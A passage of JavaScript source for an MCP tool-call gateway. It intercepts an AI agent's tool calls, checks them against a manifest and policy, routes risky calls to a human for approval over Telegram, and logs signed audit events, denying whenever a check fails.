  const args = msg.params?.arguments || {};

  console.log(`[gate] Intercepted tools/call: ${toolName}`);

  // Reload policy / standing approvals if the files changed since last read.
  // The MCP gate is long-running; bash-gate parity requires that an operator
  // rotating policy without restarting the gate takes effect immediately.
  maybeReloadPolicyAndSA();

  // Second Authority Law: re-validate constitution + manifest before every
  // tool call. Cheap in the happy path (hash cache hit); catches mid-run
  // tamper (constitution deleted, manifest replaced, etc.).
  loadManifestAndValidateConstitution(true);
  if (!CONSTITUTION_VALID) {
    emitEvent('mcp', toolName, 'deny',
      { tool: toolName, reason: 'constitution_invalid', detail: CONSTITUTION_FAIL_REASON },
      'constitution.invalid', 'critical', 100, 'gate');
    return {
      action: 'deny',
      response: {
        jsonrpc: '2.0',
        id: msg.id,
        error: {
          code: -32600,
          message: `[gate] Constitutional validation failed (${CONSTITUTION_FAIL_REASON}) — denied (fail-closed)`,
        },
      },
    };
  }

  // Manifest hard-deny (invariant #8): tamper / expiry / corrupt-parse /
  // signed-but-unverifiable manifests deny every tool call until resolved.
  // A missing manifest (invariant #7) falls through to policy-only.
  if (MANIFEST_HARD_DENY_REASON) {
    emitEvent('mcp', toolName, 'deny',
      { tool: toolName, reason: 'manifest_hard_deny', detail: MANIFEST_HARD_DENY_REASON },
      'manifest:tampered', 'critical', 100, 'manifest');
    return {
      action: 'deny',
      response: {
        jsonrpc: '2.0',
        id: msg.id,
        error: {
          code: -32600,
          message: `[gate] Manifest invalid (${MANIFEST_HARD_DENY_REASON}) — denied (fail-closed per invariant 8)`,
        },
      },
    };
  }

  // Runtime manifest-authority enforcement (parity with bin/zlar-gate lines 2175-2234)
  // Classifies the tool call into a capability category and consults the
  // manifest's deny/allow/unmatched_action. Deny always wins; unmatched actions
  // either deny outright or flag for ask-override after policy evaluation.
  // The manifest narrows policy, never widens.
  const manifestDecision = enforceManifestAuthority(toolName, MANIFEST);
  if (manifestDecision.action === 'deny') {
    emitEvent('mcp', toolName, 'deny',
      { tool: toolName, cap: manifestDecision.cap, args_preview: JSON.stringify(args).substring(0, 200) },
      manifestDecision.rule, manifestDecision.severity, manifestDecision.riskScore, manifestDecision.authorizer);
    return {
      action: 'deny',
      response: {
        jsonrpc: '2.0',
        id: msg.id,
        error: {
          code: -32600,
          message: `[manifest] Blocked by rule ${manifestDecision.rule}: Action denied by capability manifest (category: ${manifestDecision.cap})`,
        },
      },
    };
  }
  const manifestForcesAsk = manifestDecision.action === 'force_ask';

  // Evaluate policy (JSON, Cedar, or both — depending on CONFIG.policyEngine)
  const evaluation = evaluatePolicyDual(toolName, args);
  console.log(`[gate] Policy: ${evaluation.rule} → ${evaluation.action} (risk ${evaluation.riskScore})`);

  // Manifest escalation override (parity with bin/zlar-gate lines 2240-2246).
  // If manifest flagged the capability as unmatched-with-escalate and policy
  // would have allowed or logged, force the final action to "ask". Manifest
  // narrows policy, never widens — deny stays deny, ask stays ask.
  if (manifestForcesAsk && (evaluation.action === 'allow' || evaluation.action === 'log')) {
    console.log(`[gate] MANIFEST: Overriding policy ${evaluation.action} → ask (${manifestDecision.cap} not in manifest allow list)`);
    evaluation.action = 'ask';
  }

  // Novelty escalation (parity with bin/zlar-gate lines 244-276).
  // First occurrence of a given tool this session escalates allow → ask.
  // Threat model: a fresh injection attempt typically targets a fresh-shaped
  // capability — by asking on first use, we catch that window. Subsequent
  // calls of the same tool proceed under normal policy. Session-scoped on
  // purpose: across sessions the alarm resets so a previously-compromised
  // session can't grant future sessions a free pass.
  // Novelty only fires when a human is reachable (Telegram configured).
  // Without a human to show the "first use" banner, escalating allow→ask
  // would turn every first tool call into an error. In CI or headless
  // deployments, novelty is a no-op.
  const noveltyKey = toolName;
  const isNovel = !SEEN_TOOLS.has(noveltyKey);
  if (isNovel) {
    SEEN_TOOLS.add(noveltyKey);
    if (CONFIG.telegramToken && CONFIG.telegramChatId &&
        (evaluation.action === 'allow' || evaluation.action === 'log')) {
      console.log(`[gate] NOVELTY: First use of "${noveltyKey}" this session — escalating to ask`);
      evaluation.action = 'ask';
      evaluation.noveltyEscalated = true;
    }
  }

  // Agent Health / Restore escalation (parity with bin/zlar-gate lines 2455-2474).
  // Only consulted for matched allow/log with non-zero risk. INV-04: any
  // failure inside restoreCheckEscalation returns the input action unchanged,
  // so the gate cannot be crashed by the advisory layer.
  if ((evaluation.action === 'allow' || evaluation.action === 'log') &&
      (evaluation.riskScore || 0) > 0) {
    try {
      const r = restoreCheckEscalation(evaluation.action);
      if (r.escalated && r.action !== evaluation.action) {
        console.log(`[gate] RESTORE: Trust state=${r.trustState} — escalating ${evaluation.action} → ${r.action}`);
        try {
          emitEvent('mcp', toolName, 'restore_escalation',
            { tool: toolName, trust_state: r.trustState, from: evaluation.action, to: r.action },
            evaluation.rule, 'warn', evaluation.riskScore, 'gate:restore');
        } catch {}
        evaluation.action = r.action;
        evaluation.restoreEscalated = true;
        evaluation.restoreTrustState = r.trustState;
      }
    } catch {
      // INV-04: restore advisory failure must not change the gate path.
    }
  }

  switch (evaluation.action) {
    case 'allow': {
      emitEvent('mcp', toolName, 'allow', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
        evaluation.rule, evaluation.severity, evaluation.riskScore, 'policy');
      return { action: 'passthrough', msg };
    }

    case 'deny': {
      emitEvent('mcp', toolName, 'deny', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
        evaluation.rule, evaluation.severity, evaluation.riskScore, 'policy');
      return {
        action: 'deny',
        response: {
          jsonrpc: '2.0',
          id: msg.id,
          error: { code: -32600, message: `[policy] Blocked by rule ${evaluation.rule}: ${evaluation.description}` },
        },
      };
    }

    case 'ask': {
      // Check standing approvals before escalating to human
      const sa = checkStandingApproval(evaluation.rule, toolName, args);
      if (sa.match) {
        console.log(`[gate] Standing approval ${sa.approvalId} matched — auto-allow`);
        emitEvent('mcp', toolName, 'allow', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200), standing_approval: sa.approvalId },
          evaluation.rule, evaluation.severity, evaluation.riskScore, `standing:${sa.approvalId}`);
        return { action: 'passthrough', msg };
      }

      const humanId = CONFIG.telegramChatId || 'unknown';
      const actionId = genId();
      const canaryTier = getCanaryTier(humanId);

      // Tier 2 preconfirm: structural interrupt BEFORE H13 increment and H15 timer.
      // H13 must not count this ask if the human blocks it at preconfirm.
      // H15 timing must start when the main ask is sent, not when preconfirm is sent.
      if (canaryTier === 2) {
        const pcResult = await telegramPreconfirm(evaluation.rule, evaluation.riskScore, evaluation.severity, toolName);
        if (pcResult !== 'proceed') {
          const reason = pcResult === 'block' ? 'preconfirm_blocked' : 'preconfirm_timeout';
          emitEvent('mcp', toolName, 'denied', { tool: toolName, reason }, evaluation.rule, evaluation.severity, evaluation.riskScore, `gate:${reason}`);
          return {
            action: 'deny',
            response: {
              type: 'text',
              text: pcResult === 'block'
                ? `Blocked at Tier 2 preconfirm (rule ${evaluation.rule})`
                : `Tier 2 preconfirm timed out (rule ${evaluation.rule})`,
            },
          };
        }
      }

      // Human invariant pre-ask checks (H6, H13, H14).
      //
      // Advisory semantics (bash-gate parity): if a pre-check trips, we
      // LOG the condition and emit a warning audit event, but we still
      // route the ask to the human. Denying here would silence the
      // human's own channel — an attacker who can provoke rapid failing
      // asks could use that as a denial-of-service on legitimate work.
      // The human is the authority; surface the condition to them and
      // let them judge.
      const hiPre = preAskCheck(humanId);
      if (!hiPre.ok) {
        console.log(`[gate] Human invariant ADVISORY: ${hiPre.reason} (${hiPre.detail}) — routing anyway`);
        emitEvent('mcp', toolName, 'logged',
          { tool: toolName, reason: `human_${hiPre.reason}`, detail: hiPre.detail, advisory: true },
          'human_invariant.advisory', 'warn', 0, `gate:human_${hiPre.reason}`);
      }

      // H15: Record ask time for deliberation floor check — starts when main ask is sent.
      recordAskTime(humanId);

      const tierBanner = canaryTier === 2
        ? '🚨 *Pattern persists* — second flag this session — read this ask'
        : canaryTier === 1
          ? '⚡ *Pattern check* — quick approvals this session — review carefully'
          : null;
      const askFlags = {
        novelty: !!evaluation.noveltyEscalated,
        advisory: hiPre.ok ? null : `${hiPre.reason} — ${hiPre.detail}`,
        tierBanner,
        denyIntended: isDenyLabeledMcpAsk(evaluation, toolName),
      };
      const decision = await telegramAsk(actionId, toolName, args, evaluation.rule, evaluation.riskScore, evaluation.severity, evaluation.verifyHint || '', askFlags);

      switch (decision) {
        case 'allow': {
          // Human invariant post-response checks (H15, H17)
          const hiPost = postResponseCheck(humanId, evaluation.severity, 'approve', { riskScore: evaluation.riskScore });
          if (!hiPost.ok) {
            console.log(`[gate] Human invariant: approval rejected (${hiPost.reason})`);
            emitEvent('mcp', toolName, 'denied', { tool: toolName, reason: `human_${hiPost.reason}`, detail: hiPost.detail },
              evaluation.rule, evaluation.severity, evaluation.riskScore, `gate:human_${hiPost.reason}`);
            return {
              action: 'deny',
              response: {
                jsonrpc: '2.0', id: msg.id,
                error: { code: -32600, message: `[gate] Approval not accepted (${hiPost.reason}). Please review again with more time.` },
              },
            };
          }
          emitEvent('mcp', toolName, 'authorized', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
            evaluation.rule, evaluation.severity, evaluation.riskScore, `human:${CONFIG.telegramChatId}`);
          // Canary: record per-human approval, maybe send probe (fail-open — never blocks governed action).
          // v3.3.6: trigger eligibility is per-human (cross-session). The .pending routing artifact
          // remains per-session so the inbox handler can locate it via canary_pending_session_id.
          try { recordCanaryApproval(humanId); } catch {}
          try {
            if (canaryShouldTrigger(humanId, { minApprovals: CONFIG.canaryMinApprovals, cooldownS: CONFIG.canaryCooldownS })) {
              sendCanary(CONFIG.sessionId, humanId).catch(() => {});
            }
          } catch {}
          return { action: 'passthrough', msg };
        }

        case 'deny': {
          // Record denial for H14 rate tracking
          try { postResponseCheck(humanId, evaluation.severity, 'deny', { riskScore: evaluation.riskScore }); } catch {}
          emitEvent('mcp', toolName, 'denied', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
            evaluation.rule, evaluation.severity, evaluation.riskScore, `human:${CONFIG.telegramChatId}`);
          return {
            action: 'deny',
            response: {
              jsonrpc: '2.0',
              id: msg.id,
              error: { code: -32600, message: `[human] Denied by human (rule ${evaluation.rule})` },
            },
          };
        }

        default: // timeout or error
          emitEvent('mcp', toolName, 'denied', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
            evaluation.rule, evaluation.severity, evaluation.riskScore, `gate:${decision}`);
          return {
            action: 'deny',
            response: {
              jsonrpc: '2.0',
              id: msg.id,
              error: { code: -32600, message: `[gate] ${decision === 'timeout' ? 'Timed out' : 'Error'} waiting for human (rule ${evaluation.rule})` },
            },
          };
      }
    }

    case 'log': {
      emitEvent('mcp', toolName, 'logged', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
        evaluation.rule, evaluation.severity, evaluation.riskScore, 'policy');
      return { action: 'passthrough', msg };
    }

    default:
      // Fail-closed: unknown policy action → deny (never passthrough on unknown)
      emitEvent('mcp', toolName, 'deny', { tool: toolName, reason: `unknown policy action: ${evaluation.action}` },
        evaluation.rule, 'critical', 100, 'gate');
      return {
        action: 'deny',
        response: {
          jsonrpc: '2.0',
          id: msg.id,
          error: { code: -32600, message: `[gate] Unknown policy action "${evaluation.action}" — denied (fail-closed)` },
        },
      };
  }
}

function initializeGateRuntime() {
  loadPolicy();
  try {
    if (existsSync(CONFIG.policyFile)) POLICY_MTIME_MS = statSync(CONFIG.policyFile).mtimeMs;
  } catch {}
  loadStandingApprovals();
  try {
    const saFile = join(PROJECT_DIR, 'etc/standing-approvals.json');
    if (existsSync(saFile)) STANDING_APPROVALS_MTIME_MS = statSync(saFile).mtimeMs;
  } catch {}
  loadCedar();
  // Second Authority Law: validate constitution + manifest after policy is loaded.
  // Fails-closed at startup if a deployed constitution is tampered / deleted.
  loadManifestAndValidateConstitution(false);
  if (!CONSTITUTION_VALID) {
    console.error(`[gate] CRITICAL: Constitutional validation failed at startup — fail-closed: ${CONSTITUTION_FAIL_REASON}`);
  }

  // Agent Health / Restore initialization (parity with bin/zlar-gate line 235).
  // INV-04: any failure yields enabled=false — the gate proceeds unchanged.
  try {
    const r = initRestore({
      projectDir: PROJECT_DIR,
      configFile: CONFIG.restoreConfigFile,
      onForceClosed: ({ reason }) => {
        console.error(`[gate] RESTORE CRITICAL: config integrity failure (${reason}) — forcing fail-closed. All escalations set to deny.`);
        try {
          emitEvent('mcp', 'restore.config_integrity', 'deny',
            { reason }, 'restore.config_integrity', 'critical', 100, 'gate:restore');
        } catch {}
      },
    });
    if (r.enabled && !r.forcedClosed) {
      console.log('[gate] Restore: enabled');
    } else if (r.forcedClosed) {
      console.log(`[gate] Restore: FORCED CLOSED (${r.reason})`);
    }
  } catch (e) {
    console.error(`[gate] Restore init failed (non-fatal): ${e.message}`);
  }
}

// ─── TCP Proxy Mode ──────────────────────────────────────────────────────────

function startTcpProxy() {
  if (!CONFIG.upstreamHost || !CONFIG.upstreamPort) {
    console.error('[gate] --upstream host:port required for TCP mode');
    process.exit(1);
  }

  initializeGateRuntime();

  const server = createServer(async (clientSocket) => {
    console.log(`[gate] Client connected`);

    const upstream = createConnection(CONFIG.upstreamPort, CONFIG.upstreamHost, () => {
      console.log(`[gate] Connected to upstream ${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`);
    });

    let clientBuffer = '';

    clientSocket.on('data', async (data) => {
      clientBuffer += data.toString();
      const { messages, remaining } = parseMessages(clientBuffer);
      clientBuffer = remaining;

      for (const msg of messages) {
        if (msg.method) {
          // It's a request — evaluate
          const result = await handleRequest(msg);
          if (result.action === 'passthrough') {
            upstream.write(JSON.stringify(result.msg) + '\n');
          } else {
            clientSocket.write(JSON.stringify(result.response) + '\n');
          }
        } else {
          // It's a response or notification — pass through
          upstream.write(JSON.stringify(msg) + '\n');
        }
      }
    });

    // Pass upstream responses back to client
    upstream.on('data', (data) => {
      clientSocket.write(data);
    });

    upstream.on('error', (e) => {
      console.error(`[gate] Upstream error: ${e.message} — fail-closed`);
      emitEvent('mcp', 'upstream.error', 'deny', { error: e.message },
        'upstream.error', 'critical', 100, 'gate');
      // Send JSON-RPC error for any pending requests, then close
      try {
        clientSocket.write(JSON.stringify({
          jsonrpc: '2.0', id: null,
          error: { code: -32603, message: '[gate] Upstream unavailable — denied (fail-closed)' }
        }) + '\n');
      } catch (we) {
        auditInternalError('upstream_error_reply_write', we);
      }
      clientSocket.end();
    });

    clientSocket.on('error', (e) => {
      console.error(`[gate] Client error: ${e.message}`);
      upstream.end();
    });

    upstream.on('end', () => clientSocket.end());
    clientSocket.on('end', () => upstream.end());
  });

  // Loopback-only by default. Binding the gate to a routable interface would
  // expose policy evaluation and ask-flows to peers on the local network —
  // any peer could initiate actions that page Vincent's phone for approval.
  // Override with ZLAR_MCP_HOST only when an isolated network namespace
  // already restricts access.
  const listenHost = CONFIG.host || '127.0.0.1';
  server.listen(CONFIG.port, listenHost, () => {
    console.log(`[gate] ZLAR MCP Gate listening on ${listenHost}:${CONFIG.port}`);
    console.log(`[gate] Upstream: ${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`);
    console.log(`[gate] Policy: ${POLICY_VERSION}`);
    console.log(`[gate] Audit: ${CONFIG.auditFile}`);
    console.log(`[gate] Session: ${CONFIG.sessionId}`);
    console.log(`[gate] PQC: ${SIGNATURE_ALGORITHM} / ${HASH_ALGORITHM} / ${PUBLIC_KEY_ID}`);
    console.log(`[gate] Policy engine: ${CONFIG.policyEngine}${CEDAR_LOADED ? ` (Cedar ${cedarVersion()})` : ''}`);

    emitEvent('mcp', 'gate.start', 'allow', { port: CONFIG.port, upstream: `${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`, session_id: CONFIG.sessionId },
      'gate.start', 'info', 0, 'gate');
  });

  // End-of-session anchor. On clean shutdown we emit one last signed
  // event carrying the session id and the current prev_hash. Any later
  // entry claiming to belong to this session is provably forged: the
  // chain is sealed. Pair with the gate.start event to bound the
  // session from both sides. Kept synchronous so the signature lands
  // before process.exit returns.
  function sealSession(signal) {
    try {
      emitEvent('mcp', 'gate.session_sealed', 'allow',
        { session_id: CONFIG.sessionId, signal, seq_final: SEQ + 1 },
        'gate.session_sealed', 'info', 0, 'gate');
    } catch (e) {
      console.error(`[gate] WARN: session_sealed event failed: ${e.message}`);
    }
  }

  process.on('SIGINT', () => {
    sealSession('SIGINT');
    process.exit(0);
  });
  process.on('SIGTERM', () => {
    sealSession('SIGTERM');
    process.exit(0);
  });
}

// ─── Stdio Proxy Mode ────────────────────────────────────────────────────────

function loadStdioRoutingConfig() {
  if (CONFIG.upstreamHost && CONFIG.upstreamPort) return;
  if (!CONFIG.configFile) {
    console.error('[gate] --config <path> required for stdio mode');
    process.exit(1);
  }

  let entries;
  try {
    const raw = JSON.parse(readFileSync(CONFIG.configFile, 'utf8'));
    entries = Array.isArray(raw) ? raw : raw?.upstreams;
  } catch (e) {
    console.error(`[gate] stdio routing config parse failed: ${e.message}`);
    process.exit(1);
  }

  if (!Array.isArray(entries) || entries.length === 0) {
    console.error('[gate] stdio routing config has no upstream entries');
    process.exit(1);
  }

  const upstream = entries.find((entry) => entry?.transport === 'tcp') || entries[0];
  if (upstream?.transport !== 'tcp' || !upstream.host || !upstream.port) {
    console.error('[gate] stdio mode currently supports one TCP upstream descriptor');
    process.exit(1);
  }

  CONFIG.upstreamServerName = upstream.server_name || 'default';
  CONFIG.upstreamHost = upstream.host;
  CONFIG.upstreamPort = parseInt(upstream.port, 10);
}

function parseStdioMessages(buffer) {
  const messages = [];
  const errors = [];
  const lines = buffer.split('\n');
  const remaining = lines.pop() || '';

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    try {
      messages.push(JSON.parse(trimmed));
    } catch (e) {
      errors.push({ line: trimmed, error: e.message });
    }
  }

  return { messages, errors, remaining };
}

function writeStdoutJson(obj) {
  process.stdout.write(JSON.stringify(obj) + '\n');
}

function parseErrorResponse() {
  return {
    jsonrpc: '2.0',
    id: null,
    error: { code: -32700, message: '[gate] Parse error: malformed JSON-RPC line' },
  };
}

function sealStdioSession(signal) {
  try {
    emitEvent('mcp', 'gate.session_sealed', 'allow',
      { session_id: CONFIG.sessionId, signal, seq_final: SEQ + 1 },
      'gate.session_sealed', 'info', 0, 'gate');
  } catch (e) {
    console.error(`[gate] WARN: session_sealed event failed: ${e.message}`);
  }
}

function startStdioProxy() {
  loadStdioRoutingConfig();
  initializeGateRuntime();

  const upstream = createConnection(CONFIG.upstreamPort, CONFIG.upstreamHost, () => {
    console.log(`[gate] Connected to upstream ${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`);
  });

  upstream.on('data', (data) => {
    process.stdout.write(data);
  });

  upstream.on('error', (e) => {
    console.error(`[gate] Upstream error: ${e.message} — fail-closed`);
    try {
      emitEvent('mcp', 'upstream.error', 'deny', { error: e.message },
        'upstream.error', 'critical', 100, 'gate');
    } catch {}
    writeStdoutJson({
      jsonrpc: '2.0',
      id: null,
      error: { code: -32603, message: '[gate] Upstream unavailable — denied (fail-closed)' },
    });
  });

  upstream.on('end', () => {
    process.stdin.pause();
  });

  emitEvent('mcp', 'gate.start', 'allow',
    {
      transport: 'stdio',
      upstream: `${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`,
      upstream_server: CONFIG.upstreamServerName,
      session_id: CONFIG.sessionId,
    },
    'gate.start', 'info', 0, 'gate');

  console.log(`[gate] ZLAR MCP Gate stdio mode`);
  console.log(`[gate] Upstream: ${CONFIG.upstreamHost}:${CONFIG.upstreamPort}`);
  console.log(`[gate] Policy: ${POLICY_VERSION}`);
  console.log(`[gate] Audit: ${CONFIG.auditFile}`);
  console.log(`[gate] Session: ${CONFIG.sessionId}`);

  let stdinBuffer = '';
  process.stdin.setEncoding('utf8');
  process.stdin.on('data', async (data) => {
    stdinBuffer += data;
    const { messages, errors, remaining } = parseStdioMessages(stdinBuffer);
    stdinBuffer = remaining;

    for (const parseError of errors) {
      try {
        emitEvent('mcp', 'stdio.parse_error', 'deny',
          { error: parseError.error, preview: parseError.line.substring(0, 120) },
          'stdio.parse_error', 'warn', 0, 'gate');
      } catch {}
      writeStdoutJson(parseErrorResponse());
    }

    for (const msg of messages) {
      if (msg.method) {
        const result = await handleRequest(msg);
        if (result.action === 'passthrough') {
          upstream.write(JSON.stringify(result.msg) + '\n');
        } else {
          writeStdoutJson(result.response);
        }
      } else {
        upstream.write(JSON.stringify(msg) + '\n');
      }
    }
  });

  process.stdin.on('end', () => {
    sealStdioSession('stdin_eof');
    upstream.end();
  });

  process.on('SIGINT', () => {
    sealStdioSession('SIGINT');
    process.exit(0);
  });
  process.on('SIGTERM', () => {
    sealStdioSession('SIGTERM');
    process.exit(0);
  });
}

// ─── Fail-Closed: Uncaught Exception Handler ────────────────────────────────
// Any unhandled error → log and deny. The gate must never silently pass through.

process.on('uncaughtException', (err) => {
  console.error(`[gate] CRITICAL: Uncaught exception — gate will deny all: ${err.message}`);
  try {
    emitEvent('mcp', 'gate.crash', 'deny', { error: err.message, stack: (err.stack || '').substring(0, 500) },
      'gate.crash', 'critical', 100, 'gate');
  } catch {}
  process.exit(1);
});

process.on('unhandledRejection', (reason) => {
  console.error(`[gate] CRITICAL: Unhandled rejection — gate will deny all: ${reason}`);
  try {
    emitEvent('mcp', 'gate.crash', 'deny', { error: String(reason) },
      'gate.crash', 'critical', 100, 'gate');
  } catch {}
  process.exit(1);
});

// ─── Entry Point ─────────────────────────────────────────────────────────────

if (CONFIG.stdio) {
  startStdioProxy();
} else if (!CONFIG.upstreamHost) {
  console.error('[gate] Specify --upstream host:port');
  process.exit(1);
} else {
  startTcpProxy();
}
